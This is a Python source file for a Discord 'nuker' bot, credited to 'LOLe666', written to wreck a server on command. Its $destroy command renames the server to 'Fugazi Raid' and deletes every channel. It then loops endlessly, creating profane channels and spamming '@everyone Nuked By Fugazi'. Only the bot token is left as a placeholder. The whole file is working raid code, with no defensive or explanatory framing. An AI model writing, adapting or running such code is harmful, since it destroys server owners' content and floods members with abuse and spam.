# Bot produce by LOLe666


import discord
from discord.ext import commands


client = commands.Bot(command_prefix='$')

client.remove_command("help")


@client.event
async def on_ready():
    print(" ~ Nuker online ~ ")
    print("LOLe666")

@client.command()
async def destroy(ctx, member: discord.Member = None, *, reason=None):
    await ctx.message.delete()
    await ctx.guild.edit(name="Fugazi Raid")
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    while True:
        for channel in list(ctx.message.guild.channels):
            guild = ctx.message.guild

            channel = await guild.create_text_channel("Get Fucked By Fugazi")
            await channel.send("@everyone Nuked By Fugazi")
    while True:
        for channel in list(ctx.message.guild.channels):
            await channel.send("@everyone Nuked By Fugazi")



client.run("Token") # Bot's token right here
